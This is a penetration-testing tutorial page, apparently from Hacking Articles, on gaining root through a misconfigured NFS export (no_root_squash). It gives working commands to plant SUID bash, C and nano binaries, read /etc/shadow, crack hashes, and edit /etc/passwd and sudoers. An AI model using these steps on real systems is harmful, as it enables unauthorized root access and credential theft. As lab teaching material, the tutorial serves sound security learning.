@@ -1,0 +1,146 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Linux Privilege Escalation using Misconfigured NFS</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/" rel="bookmark"><time class="entry-date published" datetime="2018-05-26T16:42:52+00:00">May 26, 2018</time><time class="updated" datetime="2025-06-08T12:56:00+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">After solving several OSCP Challenges we decided to write an article on the various methods used for Linux privilege escalation, which can be helpful for our readers in their penetration testing projects. In this article, we will learn how to exploit a misconfigured NFS share to gain root access to a remote host machine.</span></p>
+<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Contents</span></h3>
+<p class="ai-optimize-8"><span style="color: #000000;">Introduction of NFS</span></p>
+<p class="ai-optimize-9"><span style="color: #000000;">Misconfigured NFS Lab setup</span></p>
+<p class="ai-optimize-10"><span style="color: #000000;">Scanning NFS shares</span></p>
+<ul>
+<li class="ai-optimize-11"><span style="color: #000000;">Nmap script</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">showmount</span></li>
+</ul>
+<p class="ai-optimize-13"><span style="color: #000000;">Exploiting NFS server for Privilege Escalation via:</span></p>
+<p class="ai-optimize-14"><strong><span style="color: #000000;">Bash file</span></strong></p>
+<p class="ai-optimize-15"><strong><span style="color: #000000;">C program file</span></strong></p>
+<p class="ai-optimize-16"><strong><span style="color: #000000;">Nano/vi</span></strong></p>
+<ul>
+<li class="ai-optimize-17"><span style="color: #000000;">Obtain a shadow file</span></li>
+<li class="ai-optimize-18"><span style="color: #000000;">Obtain passwd file</span></li>
+<li class="ai-optimize-19"><span style="color: #000000;">Obtain sudoers file</span></li>
+</ul>
+<p class="ai-optimize-20"><span style="color: #000000;"><strong>Let’s Start!!</strong></span></p>
+<h3 class="ai-optimize-8"><span style="color: #800000;">Introduction of NFS</span></h3>
+<p class="ai-optimize-21"><span style="color: #000000;"><strong>Network File System (NFS):</strong> Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP <strong>port 2049</strong> for sharing any files/directories over a network.</span></p>
+<h3 class="ai-optimize-22"><span style="color: #800000;">Misconfigured NFS Lab setup</span></h3>
+<p class="ai-optimize-23"><span style="color: #000000;">Basically, there are three core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny) you will need to configure to set up an NFS server. But to configure weak NFS server we will look only /etc/export file.</span></p>
+<p class="ai-optimize-24"><span style="color: #000000;">To <strong>install NFS</strong> service; execute below command in your terminal and open /etc/export file for configuration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo apt-get update
+sudo apt install nfs-kernel-server
+nano /etc/exports</pre>
+<p class="ai-optimize-25"><span style="color: #000000;">The <strong>/etc/exports</strong> file holds a record for each directory that you expect to share within a network machine. Each record describes how one directory or file is shared. </span></p>
+<p class="ai-optimize-26"><span style="color: #000000;">Apply basic syntax for configuration:</span></p>
+<h5 class="ai-optimize-27"><span style="color: #000000;"><strong><em> </em></strong><strong><em>Directory         Host-IP(Option-list)</em></strong></span></h5>
+<p class="ai-optimize-28"><span style="color: #000000;"><strong> </strong>There are various options will define which type of Privilege that machine will have over shared directory.</span></p>
+<ul>
+<li class="ai-optimize-29"><span style="color: #000000;"><strong>rw</strong>: Permit clients to read as well as write access to the shared directory.</span></li>
+<li class="ai-optimize-30"><span style="color: #000000;"><strong>ro</strong>: Permit clients to Read-only access to shared directory..</span></li>
+<li class="ai-optimize-31"><span style="color: #000000;"><strong>root_squash:</strong> This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account.</span></li>
+<li class="ai-optimize-32"><span style="color: #000000;"><strong>no_root_squash</strong>: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.</span></li>
+<li class="ai-optimize-33"><span style="color: #000000;"><strong>async</strong>: It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.</span></li>
+<li class="ai-optimize-34"><span style="color: #000000;"><strong>sync:   </strong>The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.</span></li>
+</ul>
+<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-3RObJ0i4tFw/WwmIfES5mAI/AAAAAAAAXDU/P8ft9HtVN1M89gDQV-wC8DME_4Lr72fbgCLcBGAs/s1600/2.png"/></span></p>
+<p class="ai-optimize-36"><span style="color: #000000;">Hopefully, it might be clear to you, how to configure the /etc/export file by using a particular option. An NFS system is considered weak or Misconfigured when following entry/record is edit into it for sharing any directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/home       *(rw,no_root_squash)</pre>
+<p class="ai-optimize-37"><span style="color: #000000;">Above entry shows that we have shared <strong>/home</strong> directory and allowed the <strong>root user</strong> on the client to access files to <strong>read/ write</strong> operation and <strong>* sign</strong> denotes connection from any Host machine. After then restart the service with help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /etc/init.d/nfs-kernel-server restart</pre>
+<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Psm3Ce1TbkQ/WwmIgCB-k3I/AAAAAAAAXDg/hJv_irFucHgXlU7FiV8ITmXMG8pHAKRjgCLcBGAs/s1600/3.png"/></span></p>
+<h3 class="ai-optimize-39"><span style="color: #800000;">Scanning NFS shares</span></h3>
+<h4 class="ai-optimize-40"><span style="color: #800000;"><span style="color: #000000;">Nmap</span></span></h4>
+<p class="ai-optimize-41"><span style="color: #000000;">You can take help of Nmap script to scan NFS service in target network because it reveals the name of share directory of the target’s system if port 2049 is opened.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV --script=nfs-showmount 192.168.1.102</pre>
+<p class="ai-optimize-42"><span style="color: #000000;"><strong><img decoding="async" src="//4.bp.blogspot.com/-IzcfdrmNx8g/WwmIgeOnh6I/AAAAAAAAXDk/3L4fLS7K6CAR4XELB-SsyqpzcdzghByWQCLcBGAs/s1600/4.png"/></strong></span></p>
+<p class="ai-optimize-43"><span style="color: #000000;">Basically nmap exports showmount -e command to identify the shared directory and here we can clearly observe <strong>/home * </strong>is shared directory for everyone in the network.</span></p>
+<h3 class="ai-optimize-44"><span style="color: #800000;">Showmount</span></h3>
+<p class="ai-optimize-45"><span style="color: #000000;">The same thing can be done manually by using showmount command but for that install the nfs-common package on your local machine with help of the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt-get install nfs-common
+showmount -e 192.168.1.102</pre>
+<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-dRCjUF9g0GQ/WwmIgTOpINI/AAAAAAAAXDo/lA9BrkfsqTIaWfW1Vo73IFK66I7FG4q2ACLcBGAs/s1600/5.png"/></span></p>
+<h3 class="ai-optimize-47"><span style="color: #800000;">Exploiting NFS server for Privilege Escalation</span></h3>
+<h4 class="ai-optimize-48"><em><span style="color: #000000;"><strong>Bash file</strong></span></em></h4>
+<p class="ai-optimize-49"><span style="color: #000000;">Now execute below command on your local machine to exploit NFS server for root privilege.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /tmp/raj
+mount -t nfs 192.168.1.102:/home /tmp/raj
+cp /bin/bash .
+chmod +s bash
+ls -la bash</pre>
+<p class="ai-optimize-50"><span style="color: #000000;">Above command will create a new folder raj inside /tmp and mount shared directory /home inside /tmp/raj. Then upload a local exploit to gain root by copying bin/bash and set suid permission.</span></p>
+<p class="ai-optimize-51"><span style="color: #000000;"><strong> <img decoding="async" src="//1.bp.blogspot.com/-zQlzIW8cLzA/WwmIgp4PvDI/AAAAAAAAXDs/JswafgeQ5RQFI6OWEaCfl3i-HIsXbiw5wCLcBGAs/s1600/6.png"/></strong></span></p>
+<p class="ai-optimize-52"><span style="color: #000000;">Use <strong>df -h</strong> command to get a summary of the amount of free disk space on each mounted disk.</span></p>
+<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-TJDvdKjKhvs/WwmIhKNWmJI/AAAAAAAAXDw/hFGitzP0aYoGiAwgI_67SsyzyNuLTKvDgCLcBGAs/s1600/7.png"/></span></p>
+<p class="ai-optimize-54"><span style="color: #000000;">First, you need to compromise the target system and then move to the privilege escalation phase. Suppose you have successfully login into victim’s machine through ssh. Now we know that /home is shared directory, therefore, move inside it and follow below steps to get root access of victim’s machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+./bash -p
+id
+whoami</pre>
+<p class="ai-optimize-55"><span style="color: #000000;">So, it was the first method to pwn the root access with help of bin/bash if NFS system is configured weak. </span></p>
+<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-4br743QnSnw/WwmIhQ-6AsI/AAAAAAAAXD4/I-H8V1XBNWY7NiEvxTHCEFCLBCAuAY8-wCLcBGAs/s1600/8.png"/></span></p>
+<h3 class="ai-optimize-57"><span style="color: #800000;">C Program</span></h3>
+<p class="ai-optimize-58"><span style="color: #000000;">Similarly, we can use C language program file for root privilege escalation. We have generated a C-Program file and copied it into /tmp/raj folder. Since it is c program file therefore first we need to compile it and then set suid permission as done above.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp asroot.c /tmp/raj
+cd /tmp/raj
+gcc asroot.c -o shell
+chmod +s shell</pre>
+<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Mh9uIJHsJpE/WwmIhbgdDFI/AAAAAAAAXD0/PKfYdtrez0g0zUCbDp0Boxrtd10NkaDYwCLcBGAs/s1600/9.png"/></span></p>
+<p class="ai-optimize-60"><span style="color: #000000;">Now repeat the above process and run the shell file to obtain root access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+./shell
+id
+whoami</pre>
+<p class="ai-optimize-61"><span style="color: #000000;"><strong> </strong>So, it was the second method to pwn the root access with help of bin/bash via c-program if NFS system is misconfigured. </span></p>
+<p class="ai-optimize-62"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-vjjPHLvuNl8/WwmIdRqYtJI/AAAAAAAAXC4/44k9wiaE5DUb75lhfkC-92i-HDh3eS7vACLcBGAs/s1600/10.png"/></span></p>
+<h3 class="ai-optimize-63"><span style="color: #800000;">Nano/Vi</span></h3>
+<p class="ai-optimize-64"><span style="color: #000000;">Nano and vi editor both are most dangerous applications that can lead to privilege escalation if share directly or indirectly. In our case, it not shared directly but still, we can use any application for exploiting root access.</span></p>
+<p class="ai-optimize-65"><span style="color: #000000;">Follow the below steps:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp /bin/nano .
+chmod 4777 nano
+ls -la nano</pre>
+<p class="ai-optimize-66"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-ryKWry1LjTQ/WwmIdaTIZwI/AAAAAAAAXC0/yyQyXw5SZ9Mm36dQYTLPGa71i5J1USlnACLcBGAs/s1600/11.png"/></span></p>
+<p class="ai-optimize-67"><span style="color: #000000;">Since we have set suid permission to nano. Therefore, after compromising target’s machine at least once we can escalate root privilege through various techniques.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+./nano -p /etc/shadow</pre>
+<p class="ai-optimize-68"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-WHOuHnvlnmQ/WwmIdQZcSoI/AAAAAAAAXCw/Z1VylL5Zpk4c1XJ00471kDdE_d8BcSZ-gCLcBGAs/s1600/12.png"/></span></p>
+<p class="ai-optimize-69"><span style="color: #000000;">When you execute the above command, it will open the shadow file. Where you can copy the hash password of any user.</span></p>
+<p class="ai-optimize-70"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-2xOpfwfVmII/WwmIeJI46oI/AAAAAAAAXC8/RVEEXKkJx2Ah3OLjMk-MQ9td12lW23WdQCLcBGAs/s1600/13.png"/></span></p>
+<p class="ai-optimize-71"><span style="color: #000000;">Here I have copied hash password of the user: raj in a text file and saved it as a shadow then used john the ripper to crack that hash password.</span></p>
+<p class="ai-optimize-72"><span style="color: #000000;">Awesome!!! It tells raj having password 123. Now either you can login as raj and verify its privilege or follow the next step.</span></p>
+<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-emOpzq3UhPw/WwmIeVmVrkI/AAAAAAAAXDA/7KfOobOlg88-lgn0Ycaaqfb8eg1rHPZjgCLcBGAs/s1600/14.png"/></span></p>
+<h4 class="ai-optimize-74"><span style="color: #000000;">Passwd file </span></h4>
+<p class="ai-optimize-75"><span style="color: #000000;">Now we know the password of raj user but we are not sure that raj has root privilege or not, therefore, we can add raj into the root group by editing etc/passwd file.</span></p>
+<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-e8mCykFcD0M/WwmIef861OI/AAAAAAAAXDE/CWum9U42QHMgywx6wvNLfo78e9lAcnMQwCLcBGAs/s1600/16.png"/></span></p>
+<p class="ai-optimize-77"><span style="color: #000000;">Open the passwd file with help of nano and make the following changes</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./nano -p etc/passwd
+raj:x:0:0:,,,:/home/raj:/bin/bash</pre>
+<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Y6BOfl-FggE/WwmIetdFtPI/AAAAAAAAXDI/d_vxpyRPt2YMuUs5V1u5hqbMjUcwxfw_QCLcBGAs/s1600/17.png"/></span></p>
+<p class="ai-optimize-79"><span style="color: #000000;">Now use su command to switch user and enter the password found for raj.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su raj
+id
+whoami</pre>
+<p class="ai-optimize-80"><span style="color: #000000;">Great!!! This was another way to get root access to the target machine.</span></p>
+<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-C1HTFSPX82I/WwmIeypiRFI/AAAAAAAAXDQ/T9nMdj7MrxIc9BucaggNSdL4y2Q2VZPqwCLcBGAs/s1600/18.png"/></span></p>
+<h4 class="ai-optimize-82"><span style="color: #000000;">Sudoers file</span></h4>
+<p class="ai-optimize-83"><span style="color: #000000;">We can also escalate root privilege by editing the sudoers file where we can assign ALL privilege to our non-root user (ignite).</span></p>
+<p class="ai-optimize-84"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-vdgApaPMaLk/WwmIe_VPXjI/AAAAAAAAXDM/f9hpZ4i6xKs6fGXnxq0hUdAe7PrN9ud-wCLcBGAs/s1600/19.png"/></span></p>
+<p class="ai-optimize-85"><span style="color: #000000;">Open the sudoers file with help of nano and make the following changes</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./nano -p /etc/sudoers
+ignite ALL=(ALL:ALL) NOPASSWD: ALL</pre>
+<p class="ai-optimize-86"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-SRNna4CUrzU/WwmIfrQbcgI/AAAAAAAAXDY/iahEg9X1OCQJkfOzly76aUvvzIga--6jwCLcBGAs/s1600/20.png"/></span></p>
+<p class="ai-optimize-87"><span style="color: #000000;">Now use sudo bash command to access root terminal and get root privilege</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo bash
+id
+whoami</pre>
+<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-G16v8qFXtIE/WwmIf5RxeWI/AAAAAAAAXDc/rjRv-4bUCGAhW9z1ipzV2qTQoIxXmgBSgCLcBGAs/s1600/21.png"/></span></p>
+<p class="ai-optimize-89"><span style="color: #000000;">Conclusion: Thus, we saw the various approaches to escalated root privilege if port 2049 is open for NFS services and the server is poorly configured. For your practice, you can play with ORCUS, which is a vulnerable lab of VulnHub, and read the article from <span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/hack-orcus-vm-ctf-challenge/">here</a></span>.</span></p>
+<p class="ai-optimize-90"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
